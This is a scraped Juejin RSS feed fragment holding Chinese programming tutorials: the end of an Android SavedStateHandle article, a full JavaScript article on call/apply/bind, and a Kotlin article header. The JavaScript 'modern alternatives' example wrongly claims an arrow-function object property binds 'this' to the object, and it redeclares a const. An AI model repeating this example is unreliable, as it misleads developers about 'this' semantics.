<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> viewModel: MyViewModel <span class="hljs-keyword">by</span> viewModels()

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onViewCreated</span><span class="hljs-params">(view: <span class="hljs-type">View</span>, savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
    <span class="hljs-keyword">super</span>.onViewCreated(view, savedInstanceState)
    <span class="hljs-comment">// 直接观察来自 SavedStateHandle 的 LiveData/StateFlow</span>
    viewModel.searchQuery.observe(viewLifecycleOwner) { query -&gt;
        <span class="hljs-comment">// UI 会自动接收到恢复的搜索词</span>
        editText.setText(query)
    }
}
</code></pre>
<h3 data-id="heading-11">💡 最佳实践与要点详解</h3>
<h4 data-id="heading-12">使用原则</h4>
<ul>
<li><strong>存小存精</strong>：只保存<strong>最小必要</strong>的 UI 状态（如 ID、关键字、索引），而非完整数据对象（如整个用户列表）。完整数据应从 Model 层（数据库、网络）重新加载。</li>
<li><strong>数据类型</strong>：优先保存 <code>Parcelable</code>, <code>Serializable</code>, 基础类型（<code>Int</code>, <code>String</code>）。复杂对象需手动序列化（如使用 Gson 转为 JSON 字符串）。</li>
<li><strong>组合使用</strong>：将 <code>SavedStateHandle</code> 用于“进程死亡恢复”，将 <code>ViewModel</code> 的常规属性用于“配置变更保留”，将 Room 数据库用于“永久存储”。</li>
</ul>
<h4 data-id="heading-13">要点详解</h4>
<ul>
<li>
<p><strong><code>SavedStateHandle</code> 与 <code>onSaveInstanceState</code> 有什么区别和联系？</strong></p>
<blockquote>
<p><strong>联系</strong>：底层都通过 Activity 的 <code>onSaveInstanceState</code> 机制将 Bundle 写入磁盘。<br/>
<strong>区别</strong>：<code>SavedStateHandle</code> 将保存逻辑<strong>上移</strong>到了 ViewModel，使数据保存成为业务逻辑的一部分，而不是视图控制器的职责，更符合架构原则。</p>
</blockquote>
</li>
<li>
<p><strong>ViewModel 已经能在旋转后保存数据，为什么还需要 <code>SavedStateHandle</code>？</strong></p>
<blockquote>
<p>这是为了应对  <strong>“进程死亡”</strong>  这一更彻底的数据销毁场景。ViewModel 的存活依赖内存，而进程死亡后内存清空。<code>SavedStateHandle</code> 通过磁盘备份，提供了最后一道保障。</p>
</blockquote>
</li>
<li>
<p><strong>什么数据应该用 <code>SavedStateHandle</code> 保存？</strong></p>
<blockquote>
<p>应保存<strong>临时、易失、但直接影响用户体验</strong>的状态。例如：</p>
<ul>
<li>用户正在填写的表单内容（未提交）。</li>
<li>列表的滚动位置。</li>
<li>当前选中的标签页或筛选条件。</li>
<li>导航栈中的当前目的地（如结合 Navigation Component）。</li>
</ul>
</blockquote>
</li>
<li>
<p><strong>如何测试包含 <code>SavedStateHandle</code> 的 ViewModel？</strong></p>
<p>可以使用 <code>SavedStateHandle.createHandle()</code> 创建测试用的句柄：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testSavedStateHandle</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// 1. 创建模拟的 SavedStateHandle 并存入初始状态</span>
    <span class="hljs-keyword">val</span> savedStateHandle = SavedStateHandle.createHandle(
        <span class="hljs-literal">null</span>, <span class="hljs-comment">// 没有恢复的 Bundle</span>
        <span class="hljs-literal">null</span>
    )
    savedStateHandle[<span class="hljs-string">"key"</span>] = <span class="hljs-string">"initial_value"</span>

    <span class="hljs-comment">// 2. 传入 ViewModel 进行测试</span>
    <span class="hljs-keyword">val</span> viewModel = MyViewModel(savedStateHandle)

    <span class="hljs-comment">// 3. 断言行为</span>
    assertEquals(<span class="hljs-string">"initial_value"</span>, viewModel.getSomeData())
}
</code></pre>
</li>
</ul>
<p>总结来说，<code>SavedStateHandle</code> 是构建健壮 Android 应用的重要工具，它巧妙地将进程死亡恢复这一系统级机制，封装成了 ViewModel 内部一个易于管理和测试的组件。正确使用它，能让你的应用在极端情况下依然为用户提供连贯的体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[call() 、bind（）、 apply() 有哪些区别]]></title>    <link>https://juejin.cn/post/7602488966610239526</link>    <guid>https://juejin.cn/post/7602488966610239526</guid>    <pubDate>2026-02-03T15:58:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488966610239526" data-draft-id="7602512226998468658" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="call() 、bind（）、 apply() 有哪些区别"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T15:58:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="代码猎人"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            call() 、bind（）、 apply() 有哪些区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    代码猎人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T15:58:45.000Z" title="Tue Feb 03 2026 15:58:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>call()、apply()、bind()</code> 都是 JavaScript 中用于<strong>显式绑定函数执行上下文（this 值）</strong>  的方法，但它们在参数传递和调用时机上有重要区别。</p>
<h2 data-id="heading-0">📌 <strong>核心区别总结</strong></h2>





























<table><thead><tr><th>方法</th><th>调用时机</th><th>参数形式</th><th>返回值</th></tr></thead><tbody><tr><td><strong>call()</strong></td><td><strong>立即执行</strong></td><td>参数列表（逐个传递）</td><td>函数的执行结果</td></tr><tr><td><strong>apply()</strong></td><td><strong>立即执行</strong></td><td>参数数组（单个数组）</td><td>函数的执行结果</td></tr><tr><td><strong>bind()</strong></td><td><strong>不立即执行</strong>，返回新函数</td><td>参数列表（可部分传入）</td><td>返回一个新函数（绑定函数）</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">🔍 <strong>详细解析</strong></h2>
<h3 data-id="heading-2"><strong>1. call()</strong></h3>
<pre><code class="hljs language-js" lang="js">func.<span class="hljs-title function_">call</span>(thisArg, arg1, arg2, ...)
</code></pre>
<p><strong>特点：</strong></p>
<ul>
<li><strong>立即调用</strong>函数</li>
<li>参数以<strong>逗号分隔的列表</strong>传递</li>
<li>适合参数个数固定的情况</li>
</ul>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">introduce</span>(<span class="hljs-params">greeting, punctuation</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, 我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span><span class="hljs-subst">${punctuation}</span>`</span>);
}

<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span> };

introduce.<span class="hljs-title function_">call</span>(person, <span class="hljs-string">'你好'</span>, <span class="hljs-string">'!'</span>);
<span class="hljs-comment">// 输出：你好, 我是张三!</span>
</code></pre>
<h3 data-id="heading-3"><strong>2. apply()</strong></h3>
<pre><code class="hljs language-js" lang="js">func.<span class="hljs-title function_">apply</span>(thisArg, [argsArray])
</code></pre>
<p><strong>特点：</strong></p>
<ul>
<li><strong>立即调用</strong>函数</li>
<li>参数以<strong>数组</strong>形式传递（或类数组对象）</li>
<li>适合参数个数不确定，或已有数组的情况</li>
</ul>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">introduce</span>(<span class="hljs-params">greeting, punctuation</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, 我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span><span class="hljs-subst">${punctuation}</span>`</span>);
}

<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">'李四'</span> };

introduce.<span class="hljs-title function_">apply</span>(person, [<span class="hljs-string">'Hello'</span>, <span class="hljs-string">'!!!'</span>]);
<span class="hljs-comment">// 输出：Hello, 我是李四!!!</span>

<span class="hljs-comment">// 实际应用：数组求最大值</span>
<span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>];
<span class="hljs-keyword">const</span> max = <span class="hljs-title class_">Math</span>.<span class="hljs-property">max</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-literal">null</span>, numbers); <span class="hljs-comment">// 7</span>
</code></pre>
<h3 data-id="heading-4"><strong>3. bind()</strong></h3>
<pre><code class="hljs language-js" lang="js">func.<span class="hljs-title function_">bind</span>(thisArg, arg1, arg2, ...)
</code></pre>
<p><strong>特点：</strong></p>
<ul>
<li><strong>不立即调用</strong>，而是返回一个新函数（绑定函数）</li>
<li>返回的函数可<strong>多次调用</strong>，且每次 <code>this</code> 都指向绑定的值</li>
<li>支持<strong>参数预设</strong>（柯里化）</li>
</ul>
<p><strong>示例：</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">introduce</span>(<span class="hljs-params">greeting, punctuation</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, 我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span><span class="hljs-subst">${punctuation}</span>`</span>);
}

<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">'王五'</span> };

<span class="hljs-comment">// 创建绑定函数，预设部分参数</span>
<span class="hljs-keyword">const</span> boundFunc = introduce.<span class="hljs-title function_">bind</span>(person, <span class="hljs-string">'Hi'</span>);
<span class="hljs-title function_">boundFunc</span>(<span class="hljs-string">'!!!'</span>);      <span class="hljs-comment">// 输出：Hi, 我是王五!!!</span>
<span class="hljs-title function_">boundFunc</span>(<span class="hljs-string">'?'</span>);        <span class="hljs-comment">// 输出：Hi, 我是王五?</span>

<span class="hljs-comment">// 实际应用：事件处理函数</span>
<span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'button'</span>);
button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">textContent</span>); <span class="hljs-comment">// this 指向 button</span>
}.<span class="hljs-title function_">bind</span>(button));
</code></pre>
<h2 data-id="heading-5">🎯 <strong>关键对比</strong></h2>
<h3 data-id="heading-6"><strong>参数传递方式</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b, c</span>) {
  <span class="hljs-keyword">return</span> a + b + c;
}

<span class="hljs-keyword">const</span> obj = {};

<span class="hljs-comment">// call：逐个传递参数</span>
sum.<span class="hljs-title function_">call</span>(obj, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);    <span class="hljs-comment">// 6</span>

<span class="hljs-comment">// apply：数组传递</span>
sum.<span class="hljs-title function_">apply</span>(obj, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// 6</span>

<span class="hljs-comment">// bind：参数预设 + 后续传递</span>
<span class="hljs-keyword">const</span> boundSum = sum.<span class="hljs-title function_">bind</span>(obj, <span class="hljs-number">1</span>);
<span class="hljs-title function_">boundSum</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);            <span class="hljs-comment">// 6</span>
<span class="hljs-title function_">boundSum</span>(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>);            <span class="hljs-comment">// 10 (1 + 4 + 5)</span>
</code></pre>
<h3 data-id="heading-7"><strong>执行时机</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">value</span>: <span class="hljs-number">10</span> };

<span class="hljs-keyword">function</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>);
}

<span class="hljs-comment">// call 和 apply 立即执行</span>
show.<span class="hljs-title function_">call</span>(obj);    <span class="hljs-comment">// 立即输出：10</span>

<span class="hljs-comment">// bind 返回函数，稍后执行</span>
<span class="hljs-keyword">const</span> boundShow = show.<span class="hljs-title function_">bind</span>(obj);
<span class="hljs-title function_">boundShow</span>();       <span class="hljs-comment">// 稍后调用，输出：10</span>
</code></pre>
<h2 data-id="heading-8">💡 <strong>实际应用场景</strong></h2>
<h3 data-id="heading-9"><strong>1. 借用方法</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 借用数组方法处理类数组对象</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sumArguments</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// arguments 是类数组，没有 reduce 方法</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">reduce</span>.<span class="hljs-title function_">call</span>(
    <span class="hljs-variable language_">arguments</span>, 
    <span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, 
    <span class="hljs-number">0</span>
  );
}
<span class="hljs-title function_">sumArguments</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">// 10</span>
</code></pre>
<h3 data-id="heading-10"><strong>2. 构造函数继承</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// 借用父类构造函数</span>
  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
</code></pre>
<h3 data-id="heading-11"><strong>3. 柯里化（部分应用函数）</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">a, b, c</span>) {
  <span class="hljs-keyword">return</span> a * b * c;
}

<span class="hljs-comment">// 预设前两个参数</span>
<span class="hljs-keyword">const</span> double = multiply.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);
<span class="hljs-title function_">double</span>(<span class="hljs-number">4</span>); <span class="hljs-comment">// 24 (2 * 3 * 4)</span>
<span class="hljs-title function_">double</span>(<span class="hljs-number">5</span>); <span class="hljs-comment">// 30 (2 * 3 * 5)</span>
</code></pre>
<h3 data-id="heading-12"><strong>4. React/Vue 中的事件处理</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// React 类组件中</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Button</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">super</span>(props);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);
  }
  
  <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>); <span class="hljs-comment">// this 正确指向组件实例</span>
  }
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{this.handleClick}</span>&gt;</span>点击<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
  }
}
</code></pre>
<h2 data-id="heading-13">⚠️ <strong>注意事项</strong></h2>
<ol>
<li><strong>箭头函数无自己的 this</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">func</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>);
func.<span class="hljs-title function_">call</span>({<span class="hljs-attr">value</span>: <span class="hljs-number">1</span>}); <span class="hljs-comment">// this 不会改变，指向定义时的上下文</span>
</code></pre>
<ol start="2">
<li><strong>参数为 null/undefined</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 非严格模式下，null/undefined 会被替换为全局对象（浏览器中为 window）</span>
<span class="hljs-comment">// 严格模式下，保持为 null/undefined</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); }
test.<span class="hljs-title function_">call</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 非严格模式：window，严格模式：null</span>
</code></pre>
<ol start="3">
<li><strong>性能考虑</strong>
<ul>
<li><code>bind()</code> 每次返回新函数，频繁使用可能产生大量函数对象</li>
<li>缓存绑定函数可优化性能</li>
</ul>
</li>
</ol>
<h2 data-id="heading-14">🆚 <strong>现代替代方案</strong></h2>
<h3 data-id="heading-15"><strong>展开运算符替代 apply</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 以前</span>
<span class="hljs-title class_">Math</span>.<span class="hljs-property">max</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-literal">null</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);

<span class="hljs-comment">// 现在</span>
<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(...[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);  <span class="hljs-comment">// 展开运算符</span>
</code></pre>
<h3 data-id="heading-16"><strong>箭头函数避免 this 绑定</strong></h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 以前需要 bind</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">value</span>: <span class="hljs-number">10</span>,
  <span class="hljs-attr">getValue</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
  }.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>)
};

<span class="hljs-comment">// 现在可用箭头函数</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">value</span>: <span class="hljs-number">10</span>,
  <span class="hljs-attr">getValue</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>  <span class="hljs-comment">// this 自动绑定到外层</span>
};
</code></pre>
<h2 data-id="heading-17">📝 <strong>总结口诀</strong></h2>
<ul>
<li><strong>call</strong>：立即调用，参数<strong>一个一个</strong>传</li>
<li><strong>apply</strong>：立即调用，参数<strong>数组</strong>一起传</li>
<li><strong>bind</strong>：不调用，返回新函数，可<strong>预设参数</strong></li>
</ul>
<p>理解这三个方法对于掌握 JavaScript 的 <code>this</code> 机制和函数式编程至关重要。在实际开发中，根据需求灵活选择合适的方法。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin coerceIn 使用详解]]></title>    <link>https://juejin.cn/post/7602488966609715238</link>    <guid>https://juejin.cn/post/7602488966609715238</guid>    <pubDate>2026-02-03T12:26:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488966609715238" data-draft-id="7602463463105495086" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin coerceIn 使用详解"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-03T12:26:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="心源xinyuan"/> <meta itemprop="url" content="https://juejin.cn/user/4283353029151694"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin coerceIn 使用详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4283353029151694/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    心源xinyuan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:26:24.000Z" title="Tue Feb 03 2026 12:26:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
